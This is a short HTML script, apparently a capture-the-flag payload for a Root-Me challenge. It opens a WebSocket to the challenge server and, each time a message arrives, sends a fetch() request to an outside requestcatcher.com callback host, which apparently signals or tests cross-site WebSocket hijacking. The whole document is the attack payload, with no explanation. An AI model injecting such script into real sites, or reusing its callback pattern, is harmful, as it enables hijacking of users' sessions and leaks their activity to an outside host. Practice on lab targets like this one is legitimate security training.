<script>
        const socket = new WebSocket('wss://ctf10.root-me.org/ws')

         socket.onopen = () => {

  socket.send("hello");
};

// Quand un message arrive
socket.onmessage = (event) => {
  fetch("https://mhyrjyj.requestcatcher.com/test500000")
};
    </script>
